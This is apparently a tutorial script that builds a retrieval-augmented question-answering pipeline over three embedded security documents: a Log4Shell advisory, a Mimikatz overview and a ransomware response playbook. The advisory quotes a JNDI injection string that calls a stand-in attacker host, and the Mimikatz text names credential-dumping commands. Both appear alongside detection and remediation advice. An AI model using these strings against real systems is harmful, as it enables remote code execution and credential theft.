# Lesson 4.4 — RAG (Retrieval-Augmented Generation)
#
# Build a RAG pipeline that lets Claude answer questions
# grounded in your own security documents.
#
# Components:
#   1. Document ingestion and chunking
#   2. Embedding with sentence-transformers
#   3. Cosine similarity retrieval
#   4. Grounded generation with Claude
#
# pip install anthropic sentence-transformers numpy

import os
import json
import numpy as np
from typing import List, Dict

# ── Try to import sentence-transformers ───────────────────────────────────────
try:
    from sentence_transformers import SentenceTransformer
    HAVE_ST = True
except ImportError:
    HAVE_ST = False
    print("sentence-transformers not installed. Run: pip install sentence-transformers")
    print("Using a simplified TF-IDF fallback for the demo.\n")

import anthropic

print("=" * 60)
print("  LESSON 4.4: RAG — SECURITY DOCUMENT Q&A")
print("=" * 60)

# ── 1. Sample security knowledge base ────────────────────────────────────────
# In a real system you'd load from files, databases, or APIs (e.g. NVD, MITRE)
SECURITY_DOCS = {
    "log4shell": """
CVE-2021-44228 — Log4Shell
Severity: Critical (CVSS 10.0)
Affected: Apache Log4j 2.x versions 2.0-beta9 through 2.14.1

Description:
Apache Log4j2 JNDI lookups allow attacker-controlled JNDI URIs to trigger
remote class loading. An attacker who can control log messages or log message
parameters can execute arbitrary code on the server.

Attack vector: Network. No authentication required. Trivially exploitable.
Attack pattern: ${jndi:ldap://attacker.com/exploit} injected into any logged field
  such as HTTP User-Agent, X-Forwarded-For, username, or any other logged parameter.

Affected products: Any Java application using Log4j2 for logging, including
  Minecraft, VMware vCenter, Cisco products, and thousands of web applications.

Remediation:
  1. Upgrade to Log4j 2.17.1 or later (primary fix)
  2. Set log4j2.formatMsgNoLookups=true as JVM argument (temporary mitigation)
  3. Remove JndiLookup class from classpath as emergency measure
  4. Apply WAF rules to block ${jndi: patterns in HTTP requests

Detection: Monitor for outbound LDAP/RMI connections from application servers.
  Look for strings matching \$\{jndi: in web server access logs.
""",

    "mimikatz": """
Mimikatz — Credential Dumping Tool
MITRE ATT&CK: T1003 - OS Credential Dumping

Overview:
Mimikatz is an open-source credential harvesting tool that extracts plaintext
passwords, hashes, PINs, and Kerberos tickets from Windows memory (LSASS process).

Common attack scenarios:
  - sekurlsa::logonpasswords: Dumps plaintext credentials from LSASS memory
  - sekurlsa::wdigest: Extracts WDigest credentials (pre-Windows 8.1)
  - lsadump::dcsync: Simulates domain controller replication to dump AD hashes
  - kerberos::golden: Creates Golden Tickets for persistent access
  - pass-the-hash: Authenticate using NTLM hash without knowing plaintext password

Detection signals:
  - LSASS memory access by non-system processes (Event ID 4688, Sysmon Event 10)
  - sekurlsa strings in process command line arguments
  - Unexpected LSASS dump files (lsass.dmp)
  - Suspicious access to HKLM\\SAM registry hive
  - Domain controller replication from non-DC sources (Event ID 4662)

Mitigations:
  - Enable Credential Guard (requires Windows 10 / Server 2016+)
  - Disable WDigest authentication (registry key)
  - Implement Protected Users security group for privileged accounts
  - Deploy AV/EDR with LSASS protection rules
  - Reduce local admin rights to limit blast radius
""",

    "ransomware_response": """
Ransomware Incident Response Playbook

Phase 1 — Detection and Triage (0-30 minutes)
  1. Confirm ransomware indicators: encrypted files, ransom note, C2 beaconing
  2. Identify Patient Zero — first infected host
  3. Assess blast radius: how many hosts and shares affected?
  4. Do NOT restart or power off infected hosts (destroys forensic evidence)

Phase 2 — Containment (30 minutes - 2 hours)
  1. Isolate infected systems from network (VLAN isolation, not shutdown)
  2. Disable affected user accounts
  3. Block known ransomware C2 IPs/domains at perimeter
  4. Identify and disconnect compromised backup systems
  5. Alert executive team and legal counsel

Phase 3 — Eradication (2-24 hours)
  1. Identify and remove ransomware binaries and persistence mechanisms
  2. Reset all potentially compromised credentials
  3. Patch the initial access vector (if known)
  4. Audit all privileged accounts for signs of compromise

Phase 4 — Recovery (1-7 days)
  1. Restore from known-good backups (verify backups are clean first)
  2. Rebuild affected systems from clean image if backup unavailable
  3. Prioritise business-critical systems for restoration
  4. Monitor restored systems for re-infection

Phase 5 — Lessons Learned (post-incident)
  1. Root cause analysis
  2. Update detection rules
  3. Test backup restoration procedures
  4. Consider cyber insurance claim if applicable
""",
}

# ── 2. Chunking ────────────────────────────────────────────────────────────────
def chunk_document(text: str, chunk_size: int = 150, overlap: int = 20) -> List[str]:
    """Split text into overlapping word chunks."""
    words = text.split()
    chunks = []
    for i in range(0, len(words), chunk_size - overlap):
        chunk = ' '.join(words[i:i + chunk_size])
        if len(chunk.strip()) > 50:  # skip tiny trailing chunks
            chunks.append(chunk)
    return chunks

# Build the chunk corpus
all_chunks = []
chunk_sources = []

for doc_name, doc_text in SECURITY_DOCS.items():
    chunks = chunk_document(doc_text)
    all_chunks.extend(chunks)
    chunk_sources.extend([doc_name] * len(chunks))

print(f"\nKnowledge base: {len(SECURITY_DOCS)} documents → {len(all_chunks)} chunks")

# ── 3. Embedding ───────────────────────────────────────────────────────────────
if HAVE_ST:
    print("\nEmbedding chunks with sentence-transformers...")
    embed_model = SentenceTransformer('all-MiniLM-L6-v2')
    chunk_embeddings = embed_model.encode(all_chunks, show_progress_bar=True)

    def embed_query(text: str) -> np.ndarray:
        return embed_model.encode([text])[0]

else:
    # TF-IDF fallback
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.metrics.pairwise import cosine_similarity as sk_cosine

    print("Using TF-IDF fallback for embeddings...")
    tfidf = TfidfVectorizer(stop_words='english')
    chunk_embeddings = tfidf.fit_transform(all_chunks).toarray()

    def embed_query(text: str) -> np.ndarray:
        return tfidf.transform([text]).toarray()[0]

print(f"Embeddings shape: {chunk_embeddings.shape}")

# ── 4. Retrieval ───────────────────────────────────────────────────────────────
def cosine_sim(a: np.ndarray, b: np.ndarray) -> float:
    return np.dot(a, b) / (np.linalg.norm(a) * np.linalg.norm(b) + 1e-8)

def retrieve(question: str, k: int = 3) -> List[Dict]:
    q_vec = embed_query(question)
    scores = [cosine_sim(q_vec, c) for c in chunk_embeddings]
    top_k = sorted(enumerate(scores), key=lambda x: x[1], reverse=True)[:k]
    return [
        {'chunk': all_chunks[i], 'source': chunk_sources[i], 'score': score}
        for i, score in top_k
    ]

# ── 5. RAG generation with Claude ─────────────────────────────────────────────
api_key = os.environ.get("ANTHROPIC_API_KEY")

def ask(question: str, use_rag: bool = True, verbose: bool = True) -> str:
    if verbose:
        print(f"\n{'='*50}")
        print(f"Q: {question}")

    if use_rag:
        retrieved = retrieve(question, k=3)
        context = "\n\n---\n\n".join([
            f"Source: {r['source']}\n{r['chunk']}"
            for r in retrieved
        ])
        if verbose:
            print(f"\nRetrieved {len(retrieved)} chunks:")
            for r in retrieved:
                print(f"  [{r['score']:.3f}] {r['source']}: {r['chunk'][:60]}...")

        system = """You are a cybersecurity expert. Answer questions using ONLY the
provided context. If the answer is not in the context, say "I don't have information
about that in the provided documents." Cite the source document name in your answer."""

        prompt = f"""Context:
{context}

Question: {question}"""
    else:
        system = "You are a cybersecurity expert. Answer concisely."
        prompt = question

    if not api_key:
        # Demo mode without API key
        if verbose:
            print("\nA: [API key not set — showing retrieval only]")
            if use_rag and retrieved:
                print(f"   Would answer from: {retrieved[0]['source']}")
        return "[No API key]"

    client = anthropic.Anthropic(api_key=api_key)
    response = client.messages.create(
        model="claude-sonnet-4-6",
        max_tokens=500,
        system=system,
        messages=[{"role": "user", "content": prompt}]
    )
    answer = response.content[0].text
    if verbose:
        print(f"\nA: {answer}")
    return answer

# ── 6. Test questions ──────────────────────────────────────────────────────────
print("\n\n── Testing RAG System ──")

questions = [
    "How do I detect Mimikatz running on a Windows machine?",
    "What should I do in the first 30 minutes of a ransomware attack?",
    "How does Log4Shell get exploited and how do I mitigate it?",
    "What is the CVSS score of CVE-2021-44228?",
]

for q in questions:
    ask(q, use_rag=True)

# ── 7. Hallucination demo (no RAG) ────────────────────────────────────────────
if api_key:
    print("\n\n── Hallucination Demo: RAG vs No RAG ──")
    tricky_q = "What is our organisation's specific ransomware recovery time objective?"
    print("\nWITH RAG:")
    ask(tricky_q, use_rag=True)
    print("\nWITHOUT RAG (may hallucinate):")
    ask(tricky_q, use_rag=False)

print("\n" + "=" * 60)
print("RAG pipeline complete.")
print("Next: Milestone — full security assistant with your own documents.")
